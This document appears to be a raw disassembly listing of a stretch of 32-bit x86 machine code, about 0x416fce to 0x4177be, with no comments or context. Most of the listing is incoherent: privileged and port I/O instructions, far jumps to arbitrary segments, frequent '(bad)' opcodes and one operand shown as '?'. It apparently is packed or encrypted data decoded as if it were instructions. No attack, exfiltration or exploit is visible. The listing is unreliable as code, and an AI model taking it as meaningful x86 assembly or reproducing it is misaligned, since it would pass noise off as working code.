  416fce:	fisub  WORD PTR [edi]
  416fd0:	dec    eax
  416fd1:	je     0x416f90
  416fd3:	fist   WORD PTR [ecx]
  416fd5:	hlt    
  416fd6:	loopne 0x416f62
  416fd8:	jmp    0xc82e1df4
  416fdd:	ficomp DWORD PTR [ebx+ecx*4-0x74021159]
  416fe4:	jae    0x41704d
  416fe6:	daa    
  416fe7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416fe8:	pop    ecx
  416fe9:	icebp  
  416fea:	shr    BYTE PTR [ecx],cl
  416fec:	shl    bh,cl
  416fee:	shl    DWORD PTR [ebx+0x7bea4c],1
  416ff4:	and    esp,0x4ea6356e
  416ffa:	mov    eax,ds:0x73a6082c
  416fff:	addr16 cdq 
  417001:	cmc    
  417002:	dec    esi
  417003:	pusha  
  417004:	sub    al,0x11
  417006:	mov    eax,DWORD PTR [ebx-0xa]
  417009:	ror    BYTE PTR [esi+0x170529b],1
  41700f:	ror    BYTE PTR [edi+0x71],1
  417012:	jmp    0x17b2:0xca7b978d
  417019:	xchg   DWORD PTR [edi-0xfc442aa],eax
  41701f:	js     0x417030
  417021:	adc    BYTE PTR [eax+0x98de41a],ch
  417027:	jge    0x41704a
  417029:	repnz shr DWORD PTR [ebp+0x70],0xdd
  41702e:	jle    0x41706e
  417030:	xor    BYTE PTR [ebx-0x26652ffa],bh
  417036:	loopne 0x417060
  417038:	xchg   ebp,eax
  417039:	fmul   QWORD PTR [esi]
  41703b:	xor    BYTE PTR [esi],bh
  41703d:	pop    ecx
  41703e:	mov    ch,0xf8
  417040:	sti    
  417041:	stos   DWORD PTR es:[edi],eax
  417042:	lods   eax,DWORD PTR ds:[esi]
  417043:	cmp    edx,ebp
  417045:	sub    al,0x22
  417047:	sahf   
  417048:	add    dh,BYTE PTR [ebx+0x55]
  41704b:	push   es
  41704c:	jmp    0xbf69:0x25499c54
  417053:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417054:	mov    al,0xff
  417056:	scas   eax,DWORD PTR es:[edi]
  417057:	xor    al,0x45
  417059:	mov    ebp,esp
  41705b:	sar    DWORD PTR [ecx-0x10],cl
  41705e:	adc    BYTE PTR [ebx+0x6e],0xf6
  417062:	mov    al,0x68
  417064:	out    0x2,eax
  417066:	push   edi
  417067:	test   DWORD PTR [esi],edi
  417069:	test   eax,0xb01c5ac1
  41706e:	and    DWORD PTR [eax-0x3f],0x26
  417072:	repz rol BYTE PTR ds:0x40cc0719,cl
  417079:	mov    WORD PTR [edx],cs
  41707b:	adc    edi,DWORD PTR [edx]
  41707d:	loopne 0x4170b0
  41707f:	pop    ds
  417080:	sub    DWORD PTR [ebp+edi*4-0x308a1098],0x57
  417088:	dec    ecx
  417089:	jecxz  0x417047
  41708b:	adc    bh,BYTE PTR [eax+0x42]
  41708e:	fistp  DWORD PTR ds:0xd3b082dd
  417094:	out    0x3a,eax
  417096:	cs push 0xffffffd5
  417099:	cmp    al,0x7f
  41709b:	xor    esi,edx
  41709d:	mov    WORD PTR [edi-0x6d],?
  4170a0:	lea    esp,[eax+0x4b790db1]
  4170a6:	add    DWORD PTR [edx-0x6786a214],ebp
  4170ac:	xor    BYTE PTR [ebx+0xb],bh
  4170af:	mov    esi,0xfc0ad0e4
  4170b4:	inc    esp
  4170b5:	adc    BYTE PTR [ebx],bl
  4170b7:	adc    BYTE PTR [edx],0x7b
  4170ba:	sbb    al,0xcd
  4170bc:	mov    ds:0xcff9e24a,al
  4170c1:	or     eax,0xa056162b
  4170c6:	sub    BYTE PTR [esi-0x5a],bh
  4170c9:	xchg   esp,eax
  4170ca:	out    dx,eax
  4170cb:	nop
  4170cc:	(bad)  
  4170cd:	int3   
  4170ce:	imul   ecx,DWORD PTR [esi+0x6805e5ac],0xe06220e5
  4170d8:	mov    bl,0x56
  4170da:	xor    edx,esp
  4170dc:	inc    edx
  4170dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4170de:	mov    edx,0x364b2e9e
  4170e3:	cli    
  4170e4:	cmp    eax,0xfceeba18
  4170e9:	aas    
  4170ea:	cmp    BYTE PTR [edx+edx*2],ah
  4170ed:	mov    bh,0x56
  4170ef:	pop    ebp
  4170f0:	mov    ebp,0x57279733
  4170f5:	fimul  WORD PTR [esi-0x59077ea9]
  4170fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4170fc:	and    eax,0x63e99749
  417101:	icebp  
  417102:	mov    esp,0x52d091e9
  417107:	inc    ebp
  417108:	sti    
  417109:	jmp    0x41708c
  41710b:	iret   
  41710c:	js     0x41714a
  41710e:	cmp    BYTE PTR [ecx-0x27],dl
  417111:	int3   
  417112:	cmp    ebx,DWORD PTR [esi+0x273797f7]
  417118:	dec    ecx
  417119:	xor    DWORD PTR [edi+0x69e9c3d3],esi
  41711f:	mov    eax,0x938f197d
  417124:	aaa    
  417125:	(bad)
  417129:	push   ds
  41712a:	(bad)  [esi-0xa]
  41712d:	fcmovne st,st(1)
  41712f:	fadd   DWORD PTR [edx]
  417131:	call   0xb9f9:0x9874772e
  417138:	and    edi,DWORD PTR ds:0xf07fa19c
  41713e:	adc    DWORD PTR [ebp-0x2b12b857],edx
  417144:	xor    eax,0xa012c25a
  417149:	jle    0x41719d
  41714b:	(bad)  
  41714d:	loope  0x41710a
  41714f:	daa    
  417150:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417151:	inc    ecx
  417152:	leave  
  417153:	push   ds
  417154:	mov    BYTE PTR [eax+esi*1],al
  417157:	sub    al,0x7d
  417159:	push   ebx
  41715a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41715b:	inc    esp
  41715c:	cmp    ch,ah
  41715e:	pop    eax
  41715f:	adc    eax,0xfac146c
  417164:	pop    esi
  417165:	pop    ss
  417166:	and    eax,0x710a2228
  41716b:	lea    ebx,[ecx]
  41716d:	add    bl,BYTE PTR [ebx-0x6fd68975]
  417173:	fcom   DWORD PTR [ebp-0x5a]
  417176:	mov    DWORD PTR [eax],ebx
  417178:	hlt    
  417179:	jmp    0x4171db
  41717b:	xchg   ebp,eax
  41717c:	pop    esp
  41717d:	shr    BYTE PTR [esi+0x58],cl
  417180:	rcr    BYTE PTR ds:0xfbf7f339,0x12
  417187:	jae    0x417138
  417189:	dec    eax
  41718a:	test   DWORD PTR [esi-0x2d136de9],ecx
  417190:	xor    dh,BYTE PTR [edx+0x6c]
  417193:	xor    bl,BYTE PTR [esi]
  417195:	push   esi
  417196:	int3   
  417197:	dec    ebx
  417198:	mov    esp,0x1f00773a
  41719d:	dec    esi
  41719e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41719f:	cmp    BYTE PTR [eax+0x72],0x32
  4171a3:	mov    cl,0x2d
  4171a5:	push   edx
  4171a6:	fsub   st(3),st
  4171a8:	inc    edx
  4171a9:	jg     0x41715c
  4171ab:	fimul  WORD PTR [edi]
  4171ad:	jp     0x41721e
  4171af:	test   edi,ebx
  4171b1:	test   ah,bh
  4171b3:	mov    edi,0x4fc4d1a0
  4171b8:	or     edi,esi
  4171ba:	push   0xffffffe6
  4171bc:	add    cl,BYTE PTR [ebp-0x518fe1f4]
  4171c2:	aaa    
  4171c3:	cmc    
  4171c4:	ror    BYTE PTR [eax+ebx*2],0x22
  4171c8:	inc    eax
  4171c9:	(bad)
  4171cc:	pop    esp
  4171cd:	aaa    
  4171ce:	push   ds
  4171cf:	mov    bh,0xfb
  4171d1:	daa    
  4171d2:	adc    DWORD PTR [esi+edx*2-0x6c34574a],esi
  4171d9:	jmp    0x3354:0x99031540
  4171e0:	in     eax,dx
  4171e1:	mov    ah,ah
  4171e3:	sbb    BYTE PTR [ebp+edx*4-0x7b8620fd],ah
  4171ea:	iret   
  4171eb:	sar    BYTE PTR [eax+0x2faa38b5],1
  4171f1:	and    DWORD PTR [ebx+0x679ce2e6],edi
  4171f7:	out    0xe4,al
  4171f9:	fdiv   DWORD PTR [edx-0x4d178de]
  4171ff:	lock out dx,al
  417201:	(bad)  
  417202:	hlt    
  417203:	or     eax,DWORD PTR [ecx]
  417205:	sub    bl,BYTE PTR [edx-0x75637d4f]
  41720b:	cs das 
  41720d:	or     ebx,DWORD PTR [eax-0x4f3e8353]
  417213:	fldcw  WORD PTR [edi+0x6c]
  417216:	sbb    bh,BYTE PTR [eax]
  417218:	xchg   esp,eax
  417219:	mov    gs:0xe4033d2b,eax
  41721f:	int3   
  417220:	ja     0x417237
  417222:	push   ebx
  417223:	addr16 rcr dl,1
  417226:	pop    ebx
  417227:	aad    0xde
  417229:	popa   
  41722a:	lods   al,BYTE PTR ds:[esi]
  41722b:	sbb    DWORD PTR [eax],ecx
  41722d:	rol    DWORD PTR [ebp+0x5b],cl
  417230:	clc    
  417231:	and    ebx,DWORD PTR [ecx-0x24]
  417234:	cli    
  417235:	adc    eax,0xa4270a03
  41723a:	jge    0x41720a
  41723c:	(bad)  
  41723d:	dec    edx
  41723e:	inc    ebx
  41723f:	add    ebx,DWORD PTR [edx+ebx*1]
  417242:	dec    ebx
  417243:	jmp    0x417527
  417248:	fsubrp st(0),st
  41724a:	(bad)  
  41724b:	stos   BYTE PTR es:[edi],al
  41724c:	mov    gs,WORD PTR [edx-0x16]
  41724f:	ins    BYTE PTR es:[edi],dx
  417250:	leave  
  417251:	pop    ebx
  417252:	sub    al,0x41
  417254:	and    bh,0x5c
  417257:	cmp    dh,BYTE PTR [eax+0x26]
  41725a:	jg     0x4172cc
  41725c:	mov    ecx,0x7d70707e
  417261:	aad    0x49
  417263:	out    0x9,eax
  417265:	fdiv   DWORD PTR [eax]
  417267:	test   ecx,edi
  417269:	retf   0x56c4
  41726c:	jns    0x4171ef
  41726e:	hlt    
  41726f:	mov    BYTE PTR [esi+0x3c82a8f3],0xbf
  417276:	mov    esp,DWORD PTR ds:[ebp-0x798c0f72]
  41727d:	jg     0x4172ab
  41727f:	jo     0x417202
  417281:	cmp    eax,0xda2f5e13
  417286:	cs retf 
  417288:	and    esi,edi
  41728a:	cmp    DWORD PTR [ebx-0x63e9dd8a],ecx
  417290:	push   0x64
  417292:	call   0xc15f:0xa75e8ced
  417299:	and    eax,0xe35872ea
  41729e:	inc    edx
  4172a0:	mov    ds:0xcde1a019,eax
  4172a5:	sar    BYTE PTR [eax-0x3e59a8b],1
  4172ab:	aas    
  4172ac:	shl    BYTE PTR [eax+eiz*2],0xa4
  4172b0:	xchg   ebp,eax
  4172b1:	jmp    0xa639:0xa91d0143
  4172b8:	sub    DWORD PTR [edx+0x1a],edi
  4172bb:	or     ebp,eax
  4172bd:	xchg   edi,eax
  4172be:	xchg   DWORD PTR [ecx-0x58],edx
  4172c1:	sub    al,bh
  4172c3:	push   eax
  4172c4:	pop    ss
  4172c5:	rol    bl,0x83
  4172c8:	and    DWORD PTR [ecx],eax
  4172ca:	mov    ds:0x216c7646,eax
  4172cf:	jmp    0xb41f:0x308174e9
  4172d6:	xchg   edi,eax
  4172d7:	fstp   QWORD PTR [ebx]
  4172d9:	popf   
  4172da:	pop    es
  4172db:	and    dl,BYTE PTR [eax+0x66]
  4172de:	pop    ds
  4172df:	cmp    ecx,DWORD PTR [edi]
  4172e1:	lods   eax,DWORD PTR ds:[esi]
  4172e2:	in     al,dx
  4172e3:	into   
  4172e4:	sub    BYTE PTR [edx],0x7f
  4172e7:	hlt    
  4172e8:	or     BYTE PTR [eax+0x75e7c418],ch
  4172ee:	ss jl  0x417354
  4172f1:	pushf  
  4172f2:	fs dec edx
  4172f4:	sub    BYTE PTR [eax+0x634c32e],0xe2
  4172fb:	mov    ah,0x80
  4172fd:	stos   BYTE PTR es:[edi],al
  4172fe:	add    BYTE PTR [ecx-0xc],dh
  417301:	mov    ah,0x4c
  417303:	adc    BYTE PTR [eax],ch
  417305:	call   DWORD PTR [ecx+ebx*2]
  417308:	out    dx,eax
  417309:	add    DWORD PTR [esi],0x95650cdd
  41730f:	xor    ecx,DWORD PTR [ecx+0x18]
  417312:	into   
  417313:	cmc    
  417314:	jecxz  0x4172a6
  417316:	and    esp,ebx
  417318:	pop    ebx
  417319:	(bad)  
  41731a:	icebp  
  41731b:	(bad)  
  41731d:	stos   WORD PTR es:[edi],ax
  41731f:	jmp    0x82139b15
  417324:	and    dh,bh
  417326:	pop    eax
  417327:	add    ah,0x2c
  41732a:	sbb    ch,BYTE PTR [edi-0x20]
  41732d:	ret    
  41732e:	push   esp
  41732f:	inc    esi
  417330:	(bad)  
  417331:	int    0xe1
  417333:	jmp    0x932d:0x2ebf
  417339:	rcl    BYTE PTR [ebp+ebx*8-0x58767401],0x5d
  417341:	push   0x3f1da9d1
  417346:	inc    ecx
  417347:	int    0x28
  417349:	and    BYTE PTR [ebx+0x74],dh
  41734c:	adc    dh,BYTE PTR [eax+0x6d]
  41734f:	inc    eax
  417350:	scas   eax,DWORD PTR es:[edi]
  417351:	test   al,0x54
  417353:	cmp    BYTE PTR [ebp+0x14],0xb
  417357:	imul   eax,DWORD PTR [esp+ebp*4-0x7f],0x23
  41735c:	lods   al,BYTE PTR cs:[esi]
  41735e:	and    edx,eax
  417360:	mov    edx,0x7e2642de
  417365:	xchg   esp,eax
  417366:	dec    edi
  417367:	xchg   esp,eax
  417368:	add    eax,0x67fe96a0
  41736d:	lods   ax,WORD PTR cs:[esi]
  417370:	mov    DWORD PTR [edi],ebx
  417372:	xchg   ebx,eax
  417373:	mov    BYTE PTR [ebx+0x41521ad9],0x8
  41737a:	jmp    0x4173ce
  41737c:	imul   edx,edi,0xf7abfa17
  417382:	int    0xcb
  417384:	push   edx
  417385:	int    0x17
  417387:	push   edx
  417388:	mov    edx,0xf3d3185b
  41738d:	add    edx,DWORD PTR [edx+0x5e6bf346]
  417393:	jle    0x4173e4
  417395:	div    bh
  417397:	shr    BYTE PTR [edi+0x5d787e83],0x60
  41739e:	jle    0x4173b6
  4173a0:	mov    edi,0xc53c676
  4173a5:	fisub  DWORD PTR [edi*1-0x2b579588]
  4173ac:	dec    ebx
  4173ad:	pop    esi
  4173ae:	push   esp
  4173af:	int3   
  4173b0:	iret   
  4173b1:	inc    DWORD PTR ds:0x703fed7
  4173b7:	sub    al,0x8
  4173b9:	push   esi
  4173ba:	jne    0x4173d0
  4173bc:	or     al,0x74
  4173bf:	cmp    BYTE PTR [ecx+0x7d],bl
  4173c2:	test   BYTE PTR cs:[ebp+0x3d5fdf84],dh
  4173c9:	pop    ds
  4173ca:	sub    ecx,DWORD PTR [edx-0x2b]
  4173cd:	dec    ecx
  4173ce:	lea    edx,[edx+0x2e037622]
  4173d4:	imul   ebx,DWORD PTR [edx],0xffffffd6
  4173d7:	fdivrp st(1),st
  4173d9:	and    BYTE PTR [eax+ecx*8-0x25],bh
  4173dd:	out    dx,al
  4173de:	in     eax,dx
  4173df:	pop    ebx
  4173e0:	aaa    
  4173e1:	pushf  
  4173e2:	adc    BYTE PTR [edx-0x34c1037f],al
  4173e8:	inc    ebx
  4173e9:	and    BYTE PTR [eax-0x10],0xe2
  4173ed:	mov    bl,0xbd
  4173ef:	(bad)  
  4173f0:	shl    BYTE PTR [eiz*8-0x488f9fd],0x88
  4173f8:	in     eax,dx
  4173f9:	jnp    0x417397
  4173fb:	and    esp,DWORD PTR [edx-0x52]
  4173fe:	inc    esp
  4173ff:	scas   al,BYTE PTR es:[edi]
  417400:	add    edx,edx
  417402:	(bad)  
  417403:	dec    edx
  417404:	xor    al,BYTE PTR [ecx-0x7d]
  417407:	cmp    DWORD PTR [ecx-0x40d642c6],ebx
  41740d:	mov    ebx,0x9b8002b6
  417412:	lods   al,BYTE PTR ds:[esi]
  417413:	ins    DWORD PTR es:[edi],dx
  417414:	subps  xmm1,XMMWORD PTR [esi]
  417417:	out    dx,al
  417418:	mov    esi,0x780eac7
  41741d:	scas   eax,DWORD PTR es:[edi]
  41741e:	lods   eax,DWORD PTR ds:[esi]
  41741f:	int3   
  417420:	mov    edi,0xf08a9941
  417425:	mov    ds:0x580faf66,eax
  41742a:	ss jge 0x417460
  41742d:	cmp    al,0xbb
  41742f:	jmp    0x77ce:0x27728a76
  417436:	in     al,dx
  417437:	clc    
  417438:	aad    0xff
  41743a:	xor    BYTE PTR [esi+0x55eff189],bh
  417440:	sbb    edx,0xfffffff7
  417443:	(bad)
  417446:	and    BYTE PTR [eax-0x63f2825b],ch
  41744c:	or     BYTE PTR [edx],dl
  41744e:	lahf   
  41744f:	mov    BYTE PTR [edi],bl
  417451:	fsubr  QWORD PTR [ebx-0x78]
  417454:	fdiv   DWORD PTR [ecx-0x41305b68]
  41745a:	popf   
  41745b:	data16 sbb BYTE PTR [esi-0x2c],ch
  41745f:	jmp    0x41743c
  417461:	add    DWORD PTR [edx],0xffffffcd
  417464:	(bad)  
  417465:	loopne 0x417438
  417467:	outs   dx,DWORD PTR ds:[esi]
  417468:	fidivr DWORD PTR [eax+esi*4-0x77cf5b24]
  41746f:	jns    0x417451
  417471:	ss in  al,dx
  417473:	imul   edi,DWORD PTR [ebp+0x59a2f6e8],0x8
  41747a:	cmp    eax,0x645e2653
  41747f:	arpl   WORD PTR [esi-0x2],dx
  417482:	dec    edi
  417483:	cmp    ebx,0xa9f4cc18
  417489:	popa   
  41748a:	pop    edi
  41748b:	sub    cl,BYTE PTR [esi-0x43]
  41748e:	lahf   
  41748f:	call   0x351f9600
  417494:	push   ss
  417495:	push   esi
  417496:	cmp    eax,DWORD PTR ds:[edi]
  417499:	jae    0x417463
  41749b:	mov    DWORD PTR [eax+0x4f],ecx
  41749e:	inc    ebx
  41749f:	xchg   edi,eax
  4174a0:	pusha  
  4174a1:	mov    edi,0x57ebb132
  4174a6:	mov    bh,0x3b
  4174a8:	dec    eax
  4174a9:	aad    0x2d
  4174ab:	fisub  WORD PTR [eax]
  4174ad:	adc    al,0xa5
  4174af:	neg    BYTE PTR ds:0x72f0817a
  4174b5:	test   esp,esp
  4174b7:	es sbb eax,0x1e136ef5
  4174bd:	stos   DWORD PTR es:[edi],eax
  4174be:	in     eax,dx
  4174bf:	in     al,dx
  4174c0:	jne    0x4174f3
  4174c2:	add    al,0x68
  4174c4:	xor    eax,0x26ae0c43
  4174c9:	(bad)  
  4174ca:	call   0x5edc4e90
  4174cf:	sbb    BYTE PTR [edx+0x3a0dfb5c],ah
  4174d5:	mov    esp,0xee598a46
  4174da:	je     0x4174f6
  4174dc:	into   
  4174dd:	(bad)  
  4174de:	in     al,0xf
  4174e0:	push   esp
  4174e1:	or     esi,edx
  4174e3:	xchg   ebp,eax
  4174e4:	inc    dl
  4174e6:	jmp    0x41747c
  4174e8:	and    esi,DWORD PTR [ebx-0x13]
  4174eb:	mov    esi,0x75b8e16b
  4174f0:	add    eax,0xb0c835e6
  4174f5:	(bad)  
  4174f6:	inc    esi
  4174f7:	(bad)  
  4174f8:	lods   al,BYTE PTR ds:[esi]
  4174f9:	stos   DWORD PTR es:[edi],eax
  4174fa:	std    
  4174fb:	shl    DWORD PTR [ecx+esi*8],1
  4174fe:	mov    bh,0x93
  417500:	cmp    eax,0xfae078c6
  417505:	fnstsw WORD PTR [ecx+0xce1b29b]
  41750b:	xchg   ecx,eax
  41750c:	mov    ebx,0xf1dd411e
  417511:	lods   eax,DWORD PTR ds:[esi]
  417512:	pushf  
  417513:	xor    DWORD PTR [edi-0x27],ebp
  417516:	cs jmp 0x9e0bda85
  41751c:	call   0x7e54ddbd
  417521:	xor    dh,ah
  417523:	popa   
  417524:	jmp    0x4174cd
  417526:	pop    edx
  417527:	xor    edx,edx
  417529:	add    DWORD PTR [ebp-0xc],ebx
  41752c:	pop    ebx
  41752d:	mov    eax,DWORD PTR [ebp-0xc]
  417530:	pop    edi
  417531:	jmp    0x417815
  417536:	cld    
  417537:	pop    esi
  417538:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417539:	addr16 popa 
  41753b:	gs mov esp,0x68365a61
  417541:	mov    DWORD PTR [edx+0x73],eax
  417544:	pop    ds
  417545:	cli    
  417546:	mov    ecx,0xb9707f24
  41754b:	jle    0x4175bd
  41754d:	jo     0x41759a
  41754f:	and    DWORD PTR [esi+0x4b6f1823],ecx
  417555:	sub    eax,DWORD PTR [ecx+0x5c7be5f4]
  41755b:	jb     0x4174fc
  41755d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41755e:	sub    BYTE PTR [edx],dh
  417560:	jae    0x417540
  417562:	xor    DWORD PTR [esi+0x39],0xffffffd7
  417566:	outs   dx,DWORD PTR ss:[esi]
  417568:	or     eax,0x5114eef
  41756d:	(bad)  
  41756e:	in     al,0x39
  417570:	mov    eax,0x996afd15
  417575:	mov    ah,0x4f
  417577:	add    BYTE PTR [edi],0x82
  41757a:	fwait
  41757b:	xor    ah,BYTE PTR ds:0x93d39cdd
  417581:	pop    ds
  417582:	push   0x3c
  417584:	cmp    ecx,edx
  417586:	cmp    bh,BYTE PTR [eax+0x73bc72bb]
  41758c:	test   al,0xbe
  41758e:	xchg   esp,eax
  41758f:	xor    DWORD PTR [ecx+0x539ec424],0x39
  417596:	test   DWORD PTR cs:[ebx+0x1a],0xc3b04831
  41759e:	xor    bl,dl
  4175a0:	test   BYTE PTR [ebp+ebp*2-0x1bf00ffe],cl
  4175a7:	dec    edx
  4175a8:	push   eax
  4175a9:	or     eax,0xf0534fa6
  4175ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4175af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4175b0:	gs out dx,al
  4175b2:	dec    ebx
  4175b3:	(bad)  
  4175b4:	(bad)  
  4175b5:	xlat   BYTE PTR ds:[ebx]
  4175b6:	adc    edi,DWORD PTR [edi]
  4175b8:	mov    bl,0x3c
  4175ba:	sar    DWORD PTR [edx-0x17],cl
  4175bd:	cmp    ebx,DWORD PTR [ebp-0xa95e5bc]
  4175c3:	retf   0xda7f
  4175c6:	js     0x417554
  4175c8:	add    eax,ebp
  4175ca:	out    0x88,al
  4175cc:	jne    0x4175ae
  4175ce:	mov    al,0x59
  4175d0:	jae    0x417574
  4175d2:	call   FWORD PTR [edx-0x2c967434]
  4175d8:	js     0x41756e
  4175da:	push   es
  4175db:	cld    
  4175dc:	adc    bh,BYTE PTR [ebx+edi*8]
  4175df:	mov    bh,0x3b
  4175e1:	mov    ah,0xdd
  4175e3:	into   
  4175e4:	cmp    dl,BYTE PTR [eax]
  4175e6:	out    dx,eax
  4175e7:	xchg   DWORD PTR [eax+0x63],edi
  4175ea:	pop    ebx
  4175eb:	and    ebx,edi
  4175ed:	lock xchg dh,dh
  4175f0:	or     bl,BYTE PTR [esi+0x5139c9db]
  4175f6:	push   0x39a576bf
  4175fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4175fc:	pop    ebp
  4175fd:	pop    edi
  4175fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4175ff:	stc    
  417600:	pusha  
  417601:	xchg   esp,eax
  417602:	inc    esi
  417603:	xchg   ecx,eax
  417604:	inc    ecx
  417605:	hlt    
  417606:	in     eax,0x81
  417608:	mov    ebx,0xbd18fd14
  41760d:	test   ebx,edi
  41760f:	jae    0x417629
  417611:	or     bh,BYTE PTR [ebx]
  417613:	xchg   ebx,eax
  417614:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417615:	adc    al,0x25
  417617:	ficomp WORD PTR [ecx-0x24a17542]
  41761d:	xchg   edi,eax
  41761e:	mov    bh,0xa1
  417620:	fiadd  DWORD PTR [esi-0x69]
  417623:	es in  eax,dx
  417625:	pop    eax
  417626:	inc    esp
  417627:	scas   eax,DWORD PTR es:[edi]
  417628:	mov    ch,0xa9
  41762a:	sar    ch,1
  41762c:	pop    edi
  41762d:	xchg   ebp,eax
  41762e:	sub    bl,BYTE PTR [edi]
  417630:	cmp    edx,ebx
  417632:	arpl   WORD PTR [eax+edi*8+0x15],sp
  417636:	mov    dh,0x3f
  417638:	es cmp dh,cl
  41763b:	popf   
  41763c:	sahf   
  41763d:	xor    DWORD PTR ds:[ecx],esi
  417640:	sub    dl,bh
  417642:	mov    dl,0x64
  417644:	xchg   ecx,eax
  417645:	and    DWORD PTR [ebx+0x10859915],0x9c304516
  41764f:	mov    esi,ebp
  417651:	mov    ds:0xed06a143,eax
  417656:	adc    al,0x28
  417658:	idiv   BYTE PTR [esp+esi*8]
  41765b:	(bad)
  417660:	jo     0x4175fd
  417662:	icebp  
  417663:	scas   eax,DWORD PTR es:[edi]
  417664:	add    esi,esp
  417666:	out    dx,eax
  417667:	loope  0x417610
  417669:	and    eax,0xfa239916
  41766e:	test   BYTE PTR [eax],dh
  417670:	sbb    DWORD PTR es:[eax+0x38d6ad5f],edi
  417677:	or     ebp,0x4eb532e7
  41767d:	jecxz  0x4176d0
  41767f:	cdq    
  417680:	sbb    ebx,DWORD PTR [edi]
  417682:	and    bl,BYTE PTR [esi]
  417684:	test   al,0x36
  417686:	mov    eax,0xd5f8975f
  41768b:	aaa    
  41768c:	cld    
  41768d:	or     bh,bh
  41768f:	fwait
  417690:	div    BYTE PTR [edi-0x798d7635]
  417696:	dec    edx
  417697:	pusha  
  417698:	in     eax,dx
  417699:	bound  ebx,QWORD PTR ds:0x22d0b893
  41769f:	lds    ebp,FWORD PTR [ebx+0x7d0d4d32]
  4176a5:	and    bh,BYTE PTR [ecx]
  4176a7:	sbb    DWORD PTR [ebp+0x23],0x93b59a69
  4176ae:	lods   eax,DWORD PTR ds:[esi]
  4176af:	cmp    ebp,ebx
  4176b1:	sub    ch,bh
  4176b3:	js     0x4176d0
  4176b5:	jne    0x4176bc
  4176b7:	fwait
  4176b8:	pop    ecx
  4176b9:	ds repnz push 0xa8c0ed62
  4176c0:	cmp    eax,0xf4207242
  4176c5:	mov    ds:0x12aeb039,al
  4176ca:	sbb    BYTE PTR [edx-0x17e171a7],cl
  4176d0:	scas   al,BYTE PTR es:[edi]
  4176d1:	and    edx,DWORD PTR [edx+0x1c74d19a]
  4176d7:	aam    0x27
  4176d9:	scas   eax,DWORD PTR es:[edi]
  4176da:	in     al,0x3d
  4176dc:	push   ebx
  4176dd:	mov    edi,0x8056ab7f
  4176e2:	aam    0x9a
  4176e4:	cmc    
  4176e5:	das    
  4176e6:	inc    eax
  4176e7:	ins    DWORD PTR es:[edi],dx
  4176e8:	jl     0x4176f1
  4176ea:	sbb    eax,0xfa15e3f1
  4176ef:	sbb    bh,bl
  4176f1:	sub    eax,0x2ea46fc6
  4176f6:	pop    es
  4176f7:	pop    es
  4176f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4176f9:	xor    ebx,DWORD PTR [edi+ebx*8]
  4176fc:	add    DWORD PTR [ebp-0xd],ebx
  4176ff:	xchg   esi,eax
  417700:	mov    ebx,0x4c1f9d89
  417705:	jne    0x417745
  417707:	pop    ds
  417708:	mov    ecx,0xadc49081
  41770d:	call   0x57f36a82
  417712:	out    dx,eax
  417713:	push   ebp
  417714:	imul   esi,DWORD PTR [esi+0x4911a3c0],0xe8bf6522
  41771e:	pop    edi
  41771f:	sub    al,BYTE PTR [edx]
  417721:	dec    esp
  417722:	xlat   BYTE PTR ds:[ebx]
  417723:	or     bh,BYTE PTR [ebx+0x4143bef7]
  417729:	add    al,0x7f
  41772b:	sub    DWORD PTR [ecx],eax
  41772d:	popf   
  41772e:	push   ebx
  41772f:	es xchg ebp,eax
  417731:	outs   dx,BYTE PTR ds:[esi]
  417732:	cld    
  417733:	jmp    0x2000ec41
  417738:	mov    esp,0xd7ae8899
  41773d:	retf   
  41773e:	inc    esp
  41773f:	adc    edi,DWORD PTR [ecx+0x5b]
  417742:	push   0x4f
  417744:	ret    0x369d
  417747:	pop    ds
  417748:	add    DWORD PTR [ebx],edx
  41774a:	cld    
  41774b:	cmp    al,0x18
  41774d:	ret    
  41774e:	inc    esp
  41774f:	sbb    esi,DWORD PTR [edi+0xa641984]
  417755:	pop    ebx
  417756:	sbb    esp,DWORD PTR [ebx+0x5df8c659]
  41775c:	mov    WORD PTR [edi-0x5163bff5],es
  417762:	adc    DWORD PTR ss:[ebx-0x4],esi
  417766:	gs push 0x23
  417769:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41776a:	fdivr  DWORD PTR [esi]
  41776c:	stos   BYTE PTR es:[edi],al
  41776d:	mov    ebp,0x76e7fbc9
  417772:	(bad)  
  417773:	xor    eax,0x254995f0
  417778:	push   ecx
  417779:	adc    edi,DWORD PTR [ecx-0x623b3c3b]
  41777f:	ins    DWORD PTR es:[edi],dx
  417780:	fnstenv [edx]
  417782:	mov    bl,0x28
  417784:	pusha  
  417785:	push   0xffffffa6
  417787:	fwait
  417788:	outs   dx,DWORD PTR ds:[esi]
  417789:	fldcw  WORD PTR [edi*1+0x7c65ed47]
  417790:	mov    dl,0xca
  417792:	cmc    
  417793:	cwde   
  417794:	xchg   ecx,eax
  417795:	adc    dl,BYTE PTR [esi]
  417797:	mov    bl,al
  417799:	jle    0x417745
  41779b:	pop    esi
  41779c:	js     0x417747
  41779e:	add    dl,BYTE PTR [edi]
  4177a0:	or     al,0xad
  4177a2:	daa    
  4177a3:	xor    ch,BYTE PTR [edx-0x1d6aef4d]
  4177a9:	xchg   edi,eax
  4177aa:	pop    esp
  4177ab:	out    0xfe,al
  4177ad:	push   0x5c2de2eb
  4177b2:	pop    edi
  4177b3:	out    dx,al
  4177b4:	(bad)  
  4177b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4177b6:	hlt    
  4177b7:	fist   WORD PTR [edi+0x4b]
  4177ba:	adc    bh,BYTE PTR [ecx+edi*8]
  4177bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4177be:	sbb    DWORD PTR [eax-0x7226ce59],ecx
